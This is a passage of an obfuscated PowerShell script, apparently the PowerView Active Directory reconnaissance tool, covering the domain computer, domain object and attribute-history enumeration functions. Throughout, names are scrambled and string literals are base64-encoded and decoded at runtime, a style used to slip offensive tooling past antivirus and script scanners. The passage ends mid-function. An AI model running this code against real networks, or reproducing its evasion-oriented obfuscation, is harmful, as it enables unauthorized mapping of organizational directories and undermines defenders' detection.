                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${/==\_/\______/=\/} = $_.Substring(4)
                    ${/=\_/=\/\__/==\/\} = [Int](${/==\_/\/\___/\___}::${/==\_/\______/=\/})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsALwA9AFwAXwAvAD0AXAAvAFwAXwBfAC8APQA9AFwALwBcAH0AKQApAA==')))
                }
                else {
                    ${/=\_/=\/\__/==\/\} = [Int](${/==\_/\/\___/\___}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewAvAD0AXABfAC8APQBcAC8AXABfAF8ALwA9AD0AXAAvAFwAfQApAA==')))
                }
            }
            ${__/=\___/==\/====}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADkAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $(${__/=\___/==\/====}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${__/=\___/==\/====}.FindOne() }
            else { ${/==\_/=\____/===\} = ${__/=\___/==\/====}.FindAll() }
            ${/==\_/=\____/===\} | ? {$_} | % {
                ${__/==\/=\/\/\/=\/} = $True
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABpAG4AZwA=')))]) {
                    ${__/==\/=\/\/\/=\/} = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if (${__/==\/=\/\/\/=\/}) {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${__/\__/\/\_/=====} = $_
                        ${__/\__/\/\_/=====}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIALgBSAGEAdwA='))))
                    }
                    else {
                        ${__/\__/\/\_/=====} = ____/=\__/\/=\__/= -Properties $_.Properties
                        ${__/\__/\/\_/=====}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIA'))))
                    }
                    ${__/\__/\/\_/=====}
                }
            }
            if (${/==\_/=\____/===\}) {
                try { ${/==\_/=\____/===\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${__/=\___/==\/====}.dispose()
        }
    }
}
function ___/\___/\__/===\/ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${__/==\__/===\/=\/} = [Enum]::GetNames(${/==\_/\/\___/\___})
        ${__/==\__/===\/=\/} = ${__/==\__/===\/=\/} | % {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        _/=\/==\/\_/\__/== -Name UACFilter -ValidateSet ${__/==\__/===\/=\/} -_/=\/\/\_/\/\/\__/ ([array])
    }
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${___/==\__/\_/====} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            _/=\/==\/\_/\__/== -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${___/==\__/\_/====}) {
            ${_____/\_/\/=\/=\_} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${___/=\_/\/\__/===} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQApAA==')))
                }
                elseif (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0A')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${/====\/==\_/=====} = ${___/=\_/\/\__/===}.SubString(${___/=\_/\/\__/===}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsALwA9AD0APQA9AFwALwA9AD0AXABfAC8APQA9AD0APQA9AH0AJwAgAGYAcgBvAG0AIAAnACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQAnAA==')))
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/====\/==\_/=====}
                        ${___/==\__/\_/====} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                        if (-not ${___/==\__/\_/====}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewAvAD0APQA9AD0AXAAvAD0APQBcAF8ALwA9AD0APQA9AD0AfQAnAA==')))
                        }
                    }
                }
                elseif (${___/=\_/\/\__/===} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${_/==\/\_/==\_/\/=} = (([Guid]${___/=\_/\/\__/===}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAF8ALwBcAC8APQB9ACkA')))
                }
                elseif (${___/=\_/\/\__/===}.Contains('\')) {
                    ${________/==\/\/==} = ${___/=\_/\/\__/===}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | __/=\____/===\/==\ -_/=\/=\/==\/\_/=\_ Canonical
                    if (${________/==\/\/==}) {
                        ${__/\/==\_/\/==\_/} = ${________/==\/\/==}.SubString(0, ${________/==\/\/==}.IndexOf('/'))
                        ${/=\_/\/\/=\__/\_/} = ${___/=\_/\/\__/===}.Split('\')[1]
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsALwA9AFwAXwAvAFwALwBcAC8APQBcAF8AXwAvAFwAXwAvAH0AKQA=')))
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${__/\/==\_/\/==\_/}
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAXwBfAC8AXAAvAD0APQBcAF8ALwBcAC8APQA9AFwAXwAvAH0AJwAgAGYAcgBvAG0AIAAnACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQAnAA==')))
                        ${___/==\__/\_/====} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                    }
                }
                elseif (${___/=\_/\/\__/===}.Contains('.')) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKABkAG4AcwBoAG8AcwB0AG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQApAA==')))
                }
                else {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQApAA==')))
                }
            }
            if (${_____/\_/\/=\/=\_} -and (${_____/\_/\/=\/=\_}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8AXwBfAF8ALwBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | ? {$_} | % {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${/==\_/\______/=\/} = $_.Substring(4)
                    ${/=\_/=\/\__/==\/\} = [Int](${/==\_/\/\___/\___}::${/==\_/\______/=\/})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsALwA9AFwAXwAvAD0AXAAvAFwAXwBfAC8APQA9AFwALwBcAH0AKQApAA==')))
                }
                else {
                    ${/=\_/=\/\__/==\/\} = [Int](${/==\_/\/\___/\___}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewAvAD0AXABfAC8APQBcAC8AXABfAF8ALwA9AD0AXAAvAFwAfQApAA==')))
                }
            }
            if ($Filter -and $Filter -ne '') {
                ${___/==\__/\_/====}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACQARgBpAGwAdABlAHIAKQA=')))
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $(${___/==\__/\_/====}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${___/==\__/\_/====}.FindOne() }
            else { ${/==\_/=\____/===\} = ${___/==\__/\_/====}.FindAll() }
            ${/==\_/=\____/===\} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQALgBSAGEAdwA='))))
                }
                else {
                    $Object = ____/=\__/\/=\__/= -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQA'))))
                }
                $Object
            }
            if (${/==\_/=\____/===\}) {
                try { ${/==\_/=\____/===\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${___/==\__/\_/====}.dispose()
        }
    }
}
function Get-DomainObjectAttributeHistory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdABhAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))] = $FindOne }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${_/==\_/\/====\/\_} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else {
            ${_/==\_/\/====\/\_} = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        ___/\___/\__/===\/ @/=\___/=\__/=\/\/ | % {
            ${/=\/\/\_/=\/\/=\_} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${/===\/=\__/=\_/\_} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdABhAA==')))]) {
                ${___/===\/\/=\_/==} = [xml]${/===\/=\__/=\_/\_} | select -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAEEAVABUAFIAXwBNAEUAVABBAF8ARABBAFQAQQA='))) -ErrorAction SilentlyContinue
                if (${___/===\/\/=\_/==}) {
                    if (${___/===\/\/=\_/==}.pszAttributeName -Match ${_/==\_/\/====\/\_}) {
                        ${__/\/\/\_/\/\/=\/} = New-Object PSObject
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${/=\/\/\_/=\/\/=\_}
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) ${___/===\/\/=\_/==}.pszAttributeName
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${___/===\/\/=\_/==}.ftimeLastOriginatingChange
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) ${___/===\/\/=\_/==}.dwVersion
                        ${__/\/\/\_/\/\/=\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${___/===\/\/=\_/==}.pszLastOriginatingDsaDN
                        ${__/\/\/\_/\/\/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQAQQB0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                        ${__/\/\/\_/\/\/=\/}
                    }
                }
                else {
